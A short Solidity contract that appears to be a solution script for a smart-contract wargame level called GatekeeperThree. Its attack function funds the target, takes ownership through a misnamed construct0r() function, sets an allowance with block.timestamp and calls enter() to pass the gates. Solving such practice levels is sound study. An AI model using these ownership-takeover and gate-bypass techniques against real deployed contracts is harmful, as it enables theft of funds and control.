// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

contract GateKeeperThreeAttack is Broadcasted {
    function attack(
        address payable gateKeeperThreeCtr_
    ) public payable override {
        // send ether to the contract
        gateKeeperThreeCtr_.transfer(msg.value);
        // initialize the trick contract
        IGatekeeperThree(gateKeeperThreeCtr_).createTrick();
        // get GatekeeperThree contract ownership
        IGatekeeperThree(gateKeeperThreeCtr_).construct0r();
        // set to true the GatekeeperThree contract allow_entrance
        IGatekeeperThree(gateKeeperThreeCtr_).getAllowance(block.timestamp);
        // pass gates
        // making a call because the script was failing deu to internal failure
        gateKeeperThreeCtr_.call(abi.encodeWithSignature("enter()"));
    }

    function broadcastedAttack(
        address payable gateKeeperThreeCtr_
    ) external payable override {
        // intentionally not broadcasting to have msg the contract
        attack(gateKeeperThreeCtr_);
    }
}

interface IGatekeeperThree {
    function getAllowance(uint256 _timestamp) external;

    function createTrick() external;

    function construct0r() external;
}
